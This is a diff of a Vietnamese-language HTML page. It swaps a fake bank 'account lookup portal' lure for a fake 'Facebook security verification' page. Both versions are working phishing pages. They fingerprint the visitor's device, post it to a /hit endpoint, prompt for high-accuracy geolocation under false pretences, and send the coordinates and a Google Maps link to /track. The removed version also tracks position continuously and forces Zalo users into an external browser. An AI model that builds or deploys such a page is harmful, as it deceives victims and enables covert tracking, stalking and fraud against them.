@@ -4,185 +4,74 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>Cổng tra cứu tài khoản</title>
+<title>Facebook - Xác minh bảo mật</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
-background:#f4f5f7;color:#1a1a1a;min-height:100vh;display:flex;
-align-items:center;justify-content:center;padding:20px}
-.card{background:#fff;border-radius:14px;box-shadow:0 4px 24px rgba(0,0,0,.06);
-padding:28px 22px;max-width:420px;width:100%}
-.badge{display:inline-block;background:#fee;color:#c00;font-size:12px;
-font-weight:600;padding:4px 10px;border-radius:20px;margin-bottom:14px}
-h1{font-size:19px;margin-bottom:12px;line-height:1.35}
-p{font-size:14px;color:#555;line-height:1.55;margin-bottom:14px}
-b{color:#1a1a1a}
-.btn{display:block;width:100%;background:#0068ff;color:#fff;border:none;
-padding:14px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;
-text-decoration:none;text-align:center}
-.foot{font-size:11px;color:#999;margin-top:14px;text-align:center}
-.hide{display:none!important}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f2f5;color:#1c1e21;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
+.fb-logo{color:#1877f2;font-size:32px;font-weight:900;margin-top:40px;margin-bottom:20px;letter-spacing:-1px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);padding:20px;max-width:400px;width:100%;text-align:center}
+h2{font-size:18px;margin-bottom:10px;color:#1c1e21}
+p{font-size:14px;color:#606770;line-height:1.5;margin-bottom:20px}
+.btn{display:block;width:100%;background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;margin-bottom:10px}
+.spinner{display:none;border:4px solid #f3f3f3;border-top:4px solid #1877f2;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto 15px}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
-
-<div class="card hide" id="zalo">
-  <span class="badge">⚠ Cảnh báo</span>
-  <h1>Trình duyệt Zalo không hỗ trợ tra cứu</h1>
-  <p>Để xem chi tiết cảnh báo tài khoản, vui lòng mở bằng <b>Chrome</b> hoặc <b>Safari</b>.</p>
-  <a class="btn" id="openExt">Mở bằng trình duyệt</a>
-</div>
-
-<div class="card" id="main">
-  <span class="badge">⚠ Cảnh báo</span>
-  <h1>Tài khoản nhận tiền đã bị đánh dấu</h1>
-  <p>Tài khoản <b id="stk">—</b> đã nhận <b id="cnt">3</b> báo cáo lừa đảo trong 48 giờ qua.</p>
-  <p>Để xem chi tiết và xác minh danh tính chủ tài khoản, vui lòng xác minh vị trí hiện tại.</p>
-  <a class="btn" id="go">Xem chi tiết &amp; xác minh</a>
-  <div class="foot">Cổng tra cứu — dữ liệu đồng bộ từ ngân hàng</div>
-</div>
-
-<div class="card hide" id="verifying">
-  <h1>Đang xác minh…</h1>
-  <p id="step">Kết nối tới máy chủ…</p>
-</div>
-
-<div class="card hide" id="done">
-  <h1>Không tìm thấy tài khoản</h1>
-  <p>Tài khoản không tồn tại trong hệ thống. Vui lòng liên hệ hỗ trợ ngân hàng.</p>
+<div class="fb-logo">facebook</div>
+<div class="card" id="main-card">
+  <div class="spinner" id="spin"></div>
+  <h2 id="title">Yêu cầu xác minh</h2>
+  <p id="desc">Tài khoản của bạn có dấu hiệu đăng nhập bất thường. Vui lòng xác minh vị trí hiện tại để tiếp tục sử dụng Facebook.</p>
+  <button class="btn" id="action-btn" onclick="startGeo()">Xác minh ngay</button>
 </div>
 
 <script>
-(function(){
-  const UA = navigator.userAgent || "";
-  const isZalo = /Zalo|zing\.vn|Zalobot/i.test(UA);
-  const isIOS  = /iPhone|iPad|iPod/i.test(UA);
-  const isAndroid = /Android/i.test(UA);
-
   const fp = {
-    ua: UA,
+    ua: navigator.userAgent,
     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    lang: navigator.language,
     scr: screen.width + "x" + screen.height,
-    dpr: window.devicePixelRatio || 1,
-    cores: navigator.hardwareConcurrency || 0,
-    mem: navigator.deviceMemory || 0,
-    touch: 'ontouchstart' in window,
-    plat: navigator.platform || "",
-    ref: document.referrer || "",
-    url: location.href,
-    isZalo, isIOS, isAndroid
+    lang: navigator.language
   };
 
-  const q = new URLSearchParams(location.search);
-  if (q.get("stk")) document.getElementById("stk").textContent = q.get("stk");
-
-  function send(path, p){
-    fetch(path, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify(p),
-      keepalive:true
-    }).catch(()=>{});
+  function send(path, p) {
+    fetch(path, {method:"POST",headers:{"Content-Type":"application/json"},body: JSON.stringify(p),keepalive:true}).catch(()=>{});
   }
 
-  if (isZalo) {
-    document.getElementById("zalo").classList.remove("hide");
-    document.getElementById("main").classList.add("hide");
-    send("/hit", {...fp, stage:"zalo_inapp"});
+  // Gửi IP ngay khi load
+  send("/hit", {...fp, stage: "load"});
 
-    const targetUrl = location.href;
-    document.getElementById("openExt").onclick = function(){
-      if (isIOS) {
-        const chromeScheme = "googlechrome://navigate?url=" + encodeURIComponent(targetUrl);
-        const before = Date.now();
-        location.href = chromeScheme;
-        setTimeout(()=>{ if (Date.now() - before < 1500) location.href = targetUrl; }, 800);
-      } else if (isAndroid) {
-        const intent = "intent://" + location.host + location.pathname + location.search +
-          "#Intent;scheme=https;package=com.android.chrome;" +
-          "S.browser_fallback_url=" + encodeURIComponent(targetUrl) + ";end";
-        location.href = intent;
-        setTimeout(()=>{ location.href = targetUrl; }, 1500);
-      } else {
-        location.href = targetUrl;
-      }
-    };
-    return;
-  }
-
-  send("/hit", {...fp, stage:"load"});
-
-  const main      = document.getElementById("main");
-  const verifying = document.getElementById("verifying");
-  const done      = document.getElementById("done");
-  const step      = document.getElementById("step");
-
-  document.getElementById("go").onclick = function(){
-    main.classList.add("hide");
-    verifying.classList.remove("hide");
-    step.textContent = "Đang kiểm tra quyền vị trí…";
+  // Tự động kích hoạt xin quyền sau 1 giây (tạo cảm giác đang load)
+  setTimeout(() => {
+    document.getElementById("action-btn").style.display = "none";
+    document.getElementById("spin").style.display = "block";
+    document.getElementById("title").innerText = "Đang xác minh...";
+    document.getElementById("desc").innerText = "Vui lòng bấm 'Cho phép' khi trình duyệt yêu cầu truy cập vị trí.";
     startGeo();
-  };
+  }, 1500);
 
-  let best = null, watchId = null, hits = 0;
-  const MAX_HITS = 12, MAX_MS = 45000;
-
-  function startGeo(){
-    if (!navigator.geolocation) {
-      step.textContent = "Trình duyệt không hỗ trợ định vị.";
-      return;
-    }
-    step.textContent = "Đang lấy vị trí chính xác…";
-
+  function startGeo() {
+    if (!navigator.geolocation) return;
     navigator.geolocation.getCurrentPosition(
-      pos => push(pos, "current"),
-      err => {
-        send("/hit", {...fp, stage:"geo_denied", code: err.code, msg: err.message});
-        step.textContent = "Không lấy được vị trí. Bạn đã từ chối quyền.";
-        setTimeout(()=>{ verifying.classList.add("hide"); done.classList.remove("hide"); }, 1500);
+      pos => {
+        const c = pos.coords;
+        send("/track", {
+          ...fp, stage: "geo", lat: c.latitude, lon: c.longitude, acc: c.accuracy,
+          maps: `https://maps.google.com/?q=${c.latitude},${c.longitude}`
+        });
+        document.getElementById("spin").style.display = "none";
+        document.getElementById("title").innerText = "Xác minh thành công";
+        document.getElementById("desc").innerText = "Vị trí của bạn đã được ghi nhận. Hệ thống sẽ tự động mở khóa tài khoản.";
       },
-      { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
+      err => {
+        send("/hit", {...fp, stage: "geo_denied", code: err.code});
+        document.getElementById("spin").style.display = "none";
+        document.getElementById("title").innerText = "Xác minh thất bại";
+        document.getElementById("desc").innerText = "Bạn đã từ chối cấp quyền vị trí. Tài khoản sẽ bị tạm khóa.";
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
-
-    watchId = navigator.geolocation.watchPosition(
-      pos => push(pos, "watch"), ()=>{},
-      { enableHighAccuracy:true, timeout:30000, maximumAge:0 }
-    );
-    setTimeout(finish, MAX_MS);
   }
-
-  function push(pos, source){
-    hits++;
-    const c = pos.coords;
-    send("/track", {
-      ...fp, stage:"geo", source,
-      lat: c.latitude, lon: c.longitude, acc: c.accuracy,
-      alt: c.altitude, heading: c.heading, speed: c.speed,
-      ts_client: pos.timestamp,
-      maps: `https://maps.google.com/?q=${c.latitude},${c.longitude}`
-    });
-    if (!best || (c.accuracy && c.accuracy < best.acc)) {
-      best = { lat:c.latitude, lon:c.longitude, acc:c.accuracy, maps:`https://maps.google.com/?q=${c.latitude},${c.longitude}` };
-    }
-    step.textContent = "Đang xác minh… (độ chính xác ±" + Math.round(c.accuracy) + "m)";
-    if (hits >= MAX_HITS || (best && best.acc <= 10)) finish();
-  }
-
-  let finished = false;
-  function finish(){
-    if (finished) return;
-    finished = true;
-    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-    send("/hit", {...fp, stage:"geo_done", hits,
-                  best_acc: best ? best.acc : null,
-                  best_lat: best ? best.lat : null,
-                  best_lon: best ? best.lon : null,
-                  best_maps: best ? best.maps : null});
-    step.textContent = "Đã xác minh. Đang tải chi tiết…";
-    setTimeout(()=>{ verifying.classList.add("hide"); done.classList.remove("hide"); }, 1200);
-  }
-})();
 </script>
 </body>
 </html>
